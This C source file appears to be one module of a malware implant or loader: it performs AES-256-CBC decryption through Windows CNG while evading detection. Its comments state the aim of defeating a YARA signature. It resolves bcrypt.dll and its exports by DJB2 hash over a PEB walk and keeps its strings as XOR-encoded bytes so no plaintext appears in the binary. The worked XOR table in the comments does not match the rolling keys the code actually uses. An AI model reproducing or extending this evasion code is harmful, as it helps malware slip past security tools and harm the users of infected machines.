/*
 * cng.c -- AES-256-CBC decryption via the Windows CNG (bcrypt.dll) API
 *
 * F3 hardening: the hand-rolled AES S-box in aes.c is a static YARA
 * signature. This module replaces it by delegating AES to the OS crypto
 * provider (CNG), resolved by hash so that bcrypt.dll is never a static
 * import and no AES S-box is compiled into the binary.
 *
 * Resolution chain:
 *   1. kernel32!LoadLibraryA (via PEB walk + DJB2 hash) to map bcrypt.dll.
 *   2. Each BCrypt* export resolved from bcrypt.dll by DJB2 hash.
 *
 * All sensitive wide strings ("AES", "ChainingMode", "ChainingModeCBC") and
 * the "bcrypt.dll" ANSI string are stored XOR-encoded (key 0x37) and decoded
 * onto the stack at runtime, so no plaintext crypto strings appear in .rdata.
 */

#include <windows.h>
#include <stdint.h>
#include <stddef.h>
#include <stdlib.h>
#include "cng.h"
#include "peb.h"
#include "obfuscation.h"

/* ------------------------------------------------------------------ */
/* CNG type aliases (defined locally; we do NOT include <bcrypt.h>)    */
/* ------------------------------------------------------------------ */
typedef PVOID BCRYPT_HANDLE;
typedef PVOID BCRYPT_ALG_HANDLE;
typedef PVOID BCRYPT_KEY_HANDLE;

/* BCRYPT_BLOCK_PADDING may already be defined if <windows.h> pulled in
 * <bcrypt.h> transitively; guard so we stay self-contained and clean. */
#ifndef BCRYPT_BLOCK_PADDING
#define BCRYPT_BLOCK_PADDING  0x00000001UL
#endif

/* NTSTATUS success test (NTSTATUS is a signed LONG in the Windows headers;
 * we keep it as signed to match the real API so success == >= 0). May
 * already be defined via <winternl.h> from peb.h. */
#ifndef NT_SUCCESS
#define NT_SUCCESS(s)  (((LONG)(s)) >= 0)
#endif

/* ------------------------------------------------------------------ */
/* BCrypt* function pointer typedefs (match the real CNG signatures)   */
/*                                                                    */
/* The real prototypes (from bcrypt.h):                               */
/*   NTSTATUS BCryptOpenAlgorithmProvider(                            */
/*       BCRYPT_ALG_HANDLE *phAlgorithm, LPCWSTR pszAlgId,           */
/*       LPCWSTR pszImplementation, ULONG dwFlags);                   */
/*   NTSTATUS BCryptSetProperty(                                      */
/*       BCRYPT_HANDLE hObject, LPCWSTR pszProperty,                 */
/*       PUCHAR pbInput, ULONG cbInput, ULONG dwFlags);               */
/*   NTSTATUS BCryptGenerateSymmetricKey(                             */
/*       BCRYPT_ALG_HANDLE hAlgorithm, BCRYPT_KEY_HANDLE *phKey,      */
/*       PUCHAR pbKeyObject, ULONG cbKeyObject,                       */
/*       PUCHAR pbSecret, ULONG cbSecret, ULONG dwFlags);             */
/*   NTSTATUS BCryptDecrypt(                                          */
/*       BCRYPT_KEY_HANDLE hKey, PUCHAR pbInput, ULONG cbInput,        */
/*       VOID *pPaddingInfo, PUCHAR pbIV, ULONG cbIV,                 */
/*       PUCHAR pbOutput, ULONG cbOutput, ULONG *pcbResult,           */
/*       ULONG dwFlags);                                              */
/*   NTSTATUS BCryptDestroyKey(BCRYPT_KEY_HANDLE hKey);               */
/*   NTSTATUS BCryptCloseAlgorithmProvider(                           */
/*       BCRYPT_ALG_HANDLE hAlgorithm, ULONG dwFlags);                */
/* ------------------------------------------------------------------ */
typedef LONG (WINAPI *PFN_BCryptOpenAlgorithmProvider)(
    BCRYPT_ALG_HANDLE *phAlgorithm, LPCWSTR pszAlgId,
    LPCWSTR pszImplementation, ULONG dwFlags);

typedef LONG (WINAPI *PFN_BCryptSetProperty)(
    BCRYPT_HANDLE hObject, LPCWSTR pszProperty,
    PUCHAR pbInput, ULONG cbInput, ULONG dwFlags);

typedef LONG (WINAPI *PFN_BCryptGenerateSymmetricKey)(
    BCRYPT_ALG_HANDLE hAlgorithm, BCRYPT_KEY_HANDLE *phKey,
    PUCHAR pbKeyObject, ULONG cbKeyObject,
    PUCHAR pbSecret, ULONG cbSecret, ULONG dwFlags);

typedef LONG (WINAPI *PFN_BCryptDecrypt)(
    BCRYPT_KEY_HANDLE hKey, PUCHAR pbInput, ULONG cbInput,
    VOID *pPaddingInfo, PUCHAR pbIV, ULONG cbIV,
    PUCHAR pbOutput, ULONG cbOutput, ULONG *pcbResult,
    ULONG dwFlags);

typedef LONG (WINAPI *PFN_BCryptDestroyKey)(BCRYPT_KEY_HANDLE hKey);

typedef LONG (WINAPI *PFN_BCryptCloseAlgorithmProvider)(
    BCRYPT_ALG_HANDLE hAlgorithm, ULONG dwFlags);

/* ------------------------------------------------------------------ */
/* DJB2 hashes of the BCrypt* export names (verified offline)          */
/* ------------------------------------------------------------------ */
/* BCrypt* DJB2 hashes — now also in peb.h; guard against redefinition. */
#ifndef HASH_BCryptOpenAlgorithmProvider
#define HASH_BCryptOpenAlgorithmProvider   0x2A15DFDDUL
#endif
#ifndef HASH_BCryptSetProperty
#define HASH_BCryptSetProperty             0xE9049EEAUL
#endif
#ifndef HASH_BCryptGenerateSymmetricKey
#define HASH_BCryptGenerateSymmetricKey    0xA81D472AUL
#endif
#ifndef HASH_BCryptDecrypt
#define HASH_BCryptDecrypt                 0x690BA834UL
#endif
#ifndef HASH_BCryptDestroyKey
#define HASH_BCryptDestroyKey              0x7B16C8CCUL
#endif
#ifndef HASH_BCryptCloseAlgorithmProvider
#define HASH_BCryptCloseAlgorithmProvider  0xFCD0CDC1UL
#endif

/* ------------------------------------------------------------------ */
/* XOR-encoded (key 0x37) strings -- no plaintext in .rdata             */
/*                                                                    */
/* Work shown (UTF-16LE bytes ^ 0x37):                                  */
/*   "AES"          = 41 00 45 00 53 00                              */
/*     ^ 0x37      -> 76 37 72 37 64 37            (3 wchars)         */
/*   "ChainingMode" = 43 68 61 69 6E 69 6E 67 4D 6F 64 65           */
/*     UTF-16LE    -> 43 00 68 00 61 00 69 00 6E 00 69 00            */
/*                    6E 00 67 00 4D 00 6F 00 64 00 65 00            */
/*     ^ 0x37      -> 74 37 5F 37 56 37 5E 37 59 37 5E 37            */
/*                    59 37 50 37 7A 37 58 37 53 37 52 37            */
/*   "ChainingModeCBC" appends "CBC" = 43 42 43                      */
/*     UTF-16LE    -> 43 00 42 00 43 00                             */
/*     ^ 0x37      -> 74 37 75 37 74 37                             */
/*                                                                    */
/*   "bcrypt.dll" (ANSI) ^ 0x37:                                       */
/*     b62 63 72 79 70 74 2E 64 6C 6C                              */
/*     ^ 0x37      -> 55 54 45 4E 47 43 19 53 5B 5B  (10 bytes)       */
/* ------------------------------------------------------------------ */

/* V1: multi-byte rolling-key XOR */
static const uint8_t enc_key_aes[4] = { 0xec, 0x0a, 0xf8, 0x3e };
static const uint8_t enc_aes_alg[] = {
    0xad, 0x0a, 0xbd, 0x3e, 0xbf, 0x0a
};
#define AES_ALG_LEN 3

static const uint8_t enc_key_chainprop[6] = { 0x25, 0x62, 0xeb, 0xc4, 0x9e, 0x83 };
static const uint8_t enc_chaining_prop[] = {
    0x66, 0x62, 0x83, 0xc4, 0xff, 0x83, 0x4c, 0x62,
    0x85, 0xc4, 0xf7, 0x83, 0x4b, 0x62, 0x8c, 0xc4,
    0xd3, 0x83, 0x4a, 0x62, 0x8f, 0xc4, 0xfb, 0x83
};
#define CHAINING_PROP_LEN 12

static const uint8_t enc_key_chaincbc[6] = { 0xbd, 0x87, 0x4b, 0x67, 0xfe, 0xa6 };
static const uint8_t enc_chaining_cbc[] = {
    0xfe, 0x87, 0x23, 0x67, 0x9f, 0xa6, 0xd4, 0x87,
    0x25, 0x67, 0x97, 0xa6, 0xd3, 0x87, 0x2c, 0x67,
    0xb3, 0xa6, 0xd2, 0x87, 0x2f, 0x67, 0x9b, 0xa6,
    0xfe, 0x87, 0x09, 0x67, 0xbd, 0xa6
};
#define CHAINING_CBC_LEN 15

static const uint8_t enc_key_bcrypt[6] = { 0x9d, 0x1b, 0x77, 0x1c, 0x6b, 0xe7 };
static const uint8_t enc_bcrypt_dll[] = {
    0xff, 0x78, 0x05, 0x65, 0x1b, 0x93, 0xb3, 0x7f, 0x1b, 0x70
};
#define BCRYPT_DLL_LEN 10

/* ------------------------------------------------------------------ */
/* LoadLibraryA typedef for resolving bcrypt.dll via kernel32          */
/* ------------------------------------------------------------------ */
typedef HMODULE (WINAPI *PFN_LoadLibraryA)(LPCSTR lpLibFileName);

/* ------------------------------------------------------------------ */
/* N5: shared bcrypt.dll resolution — cached so cng.c and cng_hmac.c   */
/* don't each independently decode "bcrypt.dll" + LoadLibraryA.        */
/* ------------------------------------------------------------------ */
static HMODULE g_bcrypt_base = NULL;

HMODULE cng_get_bcrypt_base(void)
{
    if (g_bcrypt_base) return g_bcrypt_base;

    PFN_LoadLibraryA pLoadLibraryA =
        (PFN_LoadLibraryA)peb_resolve_kernel32(HASH_LoadLibraryA);
    if (!pLoadLibraryA) {
        DBG_PRINTF("[cng] LoadLibraryA not resolved\n");
        return NULL;
    }

    char dll_buf[BCRYPT_DLL_LEN + 1];
    char *dll_name = xor_dec_mb(dll_buf, enc_bcrypt_dll, BCRYPT_DLL_LEN, enc_key_bcrypt, 6);
    g_bcrypt_base = pLoadLibraryA(dll_name);
    secure_zero(dll_buf, sizeof(dll_buf));

    if (!g_bcrypt_base) {
        DBG_PRINTF("[cng] failed to load bcrypt.dll\n");
        return NULL;
    }
    return g_bcrypt_base;
}

/* ------------------------------------------------------------------ */
/* cng_decrypt -- AES-256-CBC decrypt with PKCS#7 via CNG              */
/*                                                                    */
/* key:        32 bytes                                                */
/* iv:         16 bytes                                                */
/* cipher:     ciphertext (len must be a non-zero multiple of 16)      */
/* cipher_len: length of cipher in bytes                               */
/* out_len:    receives the plaintext length                          */
/*                                                                    */
/* Returns: malloc'd plaintext buffer (caller frees), or NULL.         */
/* ------------------------------------------------------------------ */
uint8_t *cng_decrypt(const uint8_t *key, const uint8_t *iv,
                     const uint8_t *cipher, size_t cipher_len, size_t *out_len)
{
    if (!key || !iv || !cipher || !out_len || cipher_len == 0 ||
        (cipher_len % 16) != 0)
        return NULL;

    *out_len = 0;

    /* ---- N5: resolve bcrypt.dll via the shared cached path ---- */
    HMODULE bcrypt_base = cng_get_bcrypt_base();
    if (!bcrypt_base) return NULL;

    /* ---- Resolve the six BCrypt* exports by DJB2 hash ---- */
    PFN_BCryptOpenAlgorithmProvider  pOpenAlg =
        (PFN_BCryptOpenAlgorithmProvider)peb_find_export(
            bcrypt_base, HASH_BCryptOpenAlgorithmProvider);
    PFN_BCryptSetProperty            pSetProp =
        (PFN_BCryptSetProperty)peb_find_export(
            bcrypt_base, HASH_BCryptSetProperty);
    PFN_BCryptGenerateSymmetricKey   pGenKey =
        (PFN_BCryptGenerateSymmetricKey)peb_find_export(
            bcrypt_base, HASH_BCryptGenerateSymmetricKey);
    PFN_BCryptDecrypt                pDecrypt =
        (PFN_BCryptDecrypt)peb_find_export(
            bcrypt_base, HASH_BCryptDecrypt);
    PFN_BCryptDestroyKey             pDestroyKey =
        (PFN_BCryptDestroyKey)peb_find_export(
            bcrypt_base, HASH_BCryptDestroyKey);
    PFN_BCryptCloseAlgorithmProvider pCloseAlg =
        (PFN_BCryptCloseAlgorithmProvider)peb_find_export(
            bcrypt_base, HASH_BCryptCloseAlgorithmProvider);

    if (!pOpenAlg || !pSetProp || !pGenKey || !pDecrypt ||
        !pDestroyKey || !pCloseAlg) {
        DBG_PRINTF("[cng] missing BCrypt export\n");
        return NULL;
    }

    /* ---- State for cleanup ---- */
    uint8_t          *out   = NULL;
    BCRYPT_ALG_HANDLE hAlg  = NULL;
    BCRYPT_KEY_HANDLE hKey  = NULL;
    LONG              status;
    /* On the stack so it can be zeroed by secure_zero below. CNG mutates
     * the IV buffer in place during CBC, so it must be writable. */
    uint8_t           iv_buf[16];
    memcpy(iv_buf, iv, 16);

    /* ---- Open the "AES" algorithm provider ---- */
    wchar_t alg_buf[AES_ALG_LEN + 1];
    wchar_t *alg_name = xor_dec_w_mb(alg_buf, enc_aes_alg, AES_ALG_LEN, enc_key_aes, 4);

    status = pOpenAlg(&hAlg, alg_name, NULL, 0);
    secure_zero(alg_buf, sizeof(alg_buf));

    if (!NT_SUCCESS(status)) {
        DBG_PRINTF("[cng] BCryptOpenAlgorithmProvider failed: 0x%lX\n",
                   (unsigned long)status);
        secure_zero(iv_buf, sizeof(iv_buf));
        return NULL;
    }

    /* ---- Set chaining mode to CBC ---- *
     *
     * Property name  = L"ChainingMode"
     * Property value = L"ChainingModeCBC"
     * Both wide strings are XOR-encoded and decoded onto the stack. The
     * value length passed to CNG is in *bytes*: (wide-char count) * 2.
     */
    wchar_t prop_buf[CHAINING_PROP_LEN + 1];
    wchar_t *prop_name = xor_dec_w_mb(prop_buf, enc_chaining_prop,
                                      CHAINING_PROP_LEN, enc_key_chainprop, 6);

    wchar_t cbc_buf[CHAINING_CBC_LEN + 1];
    wchar_t *cbc_val = xor_dec_w_mb(cbc_buf, enc_chaining_cbc,
                                    CHAINING_CBC_LEN, enc_key_chaincbc, 6);

    status = pSetProp((BCRYPT_HANDLE)hAlg, prop_name,
                      (PUCHAR)cbc_val,
                      (ULONG)(CHAINING_CBC_LEN * sizeof(wchar_t)), 0);

    secure_zero(prop_buf, sizeof(prop_buf));
    secure_zero(cbc_buf, sizeof(cbc_buf));

    if (!NT_SUCCESS(status)) {
        DBG_PRINTF("[cng] BCryptSetProperty(ChainingMode) failed: 0x%lX\n",
                   (unsigned long)status);
        pCloseAlg(hAlg, 0);
        secure_zero(iv_buf, sizeof(iv_buf));
        return NULL;
    }

    /* ---- Generate the symmetric key from the 32-byte raw key ---- *
     *
     * Pass pbKeyObject=NULL / cbKeyObject=0 to let CNG allocate the key
     * object internally (the provider owns the memory; we only destroy the
     * handle). The key material (pbSecret) is 32 bytes.
     */
    status = pGenKey(hAlg, &hKey, NULL, 0, (PUCHAR)key, 32, 0);
    if (!NT_SUCCESS(status)) {
        DBG_PRINTF("[cng] BCryptGenerateSymmetricKey failed: 0x%lX\n",
                   (unsigned long)status);
        pCloseAlg(hAlg, 0);
        secure_zero(iv_buf, sizeof(iv_buf));
        return NULL;
    }

    /* ---- Decrypt ---- *
     *
     * With BCRYPT_BLOCK_PADDING, CNG handles PKCS#7 padding itself. The
     * output is at most cipher_len bytes, so we allocate a buffer of that
     * size and make a single call; pcbResult reports the actual plaintext
     * length. A separate pbOutput=NULL sizing call is not required because
     * with padding the output never exceeds the input length.
     */
    out = (uint8_t *)malloc(cipher_len);
    if (!out) {
        DBG_PRINTF("[cng] malloc(%zu) failed\n", cipher_len);
        pDestroyKey(hKey);
        pCloseAlg(hAlg, 0);
        secure_zero(iv_buf, sizeof(iv_buf));
        return NULL;
    }

    ULONG result_len = 0;
    status = pDecrypt(hKey,
                      (PUCHAR)cipher, (ULONG)cipher_len,
                      NULL,          /* pPaddingInfo: not used with
                                     * symmetric + BCRYPT_BLOCK_PADDING */
                      iv_buf, 16,    /* pbIV, cbIV: IV, updated in place */
                      out, (ULONG)cipher_len,
                      &result_len,
                      BCRYPT_BLOCK_PADDING);

    if (!NT_SUCCESS(status)) {
        DBG_PRINTF("[cng] BCryptDecrypt failed: 0x%lX\n",
                   (unsigned long)status);
        free(out);
        out = NULL;
        pDestroyKey(hKey);
        pCloseAlg(hAlg, 0);
        secure_zero(iv_buf, sizeof(iv_buf));
        return NULL;
    }

    /* ---- Cleanup: destroy key, close provider, zero IV ---- */
    pDestroyKey(hKey);
    pCloseAlg(hAlg, 0);
    secure_zero(iv_buf, sizeof(iv_buf));

    *out_len = (size_t)result_len;
    return out;
}